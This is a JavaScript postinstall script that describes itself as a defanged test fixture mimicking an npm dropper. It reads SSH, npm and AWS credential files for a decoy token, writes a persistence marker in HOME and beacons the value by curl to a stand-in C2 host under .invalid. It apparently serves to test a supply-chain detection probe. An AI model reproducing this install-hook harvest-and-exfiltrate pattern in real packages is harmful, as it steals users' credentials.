// BENIGN SYNTHETIC FIXTURE - the FLAWED twin.
//
// It reproduces the SHAPE of the npm postinstall dropper class (Zscaler
// ThreatLabz, Mar 2026: axios@1.14.1 -> plain-crypto-js postinstall RAT
// dropper; TrapDoor across npm/PyPI/Crates) with none of its substance:
//
//   1. reads a credential file out of $HOME              -> credential harvest
//   2. writes a marker outside the install prefix        -> persistence
//   3. beacons the harvested value to a C2 host          -> exfiltration
//
// Every part of that is defanged. The "credentials" are whatever decoy nonce
// the probe planted - there is nothing real to find. The marker is one text
// file in the probe's own throwaway HOME. The C2 host is under .invalid
// (RFC 2606), which no resolver will ever answer, so outside the probe's
// loopback proxy this beacon cannot leave the machine at all.
'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');

const home = os.homedir();

let secret = 'none';
for (const rel of ['.npmrc', '.ssh/id_ed25519', '.aws/credentials']) {
  try {
    const found = fs.readFileSync(path.join(home, rel), 'utf8')
      .match(/CXGDECOY[0-9A-F]+/);
    if (found) { secret = found[0]; break; }
  } catch (e) { /* not present in this environment */ }
}

try {
  fs.writeFileSync(path.join(home, '.cxg-fixture-installhook-marker'),
                   secret + '\n');
} catch (e) { /* ignore */ }

try {
  execFileSync('curl', [
    '-s', '--max-time', '5', '-o', '/dev/null',
    'http://cxg-fixture-c2.invalid/beacon?d=' + encodeURIComponent(secret),
  ], { stdio: 'ignore' });
} catch (e) { /* no route, no proxy: the beacon simply fails */ }

console.log('cxg-fixture-flawed: postinstall complete');
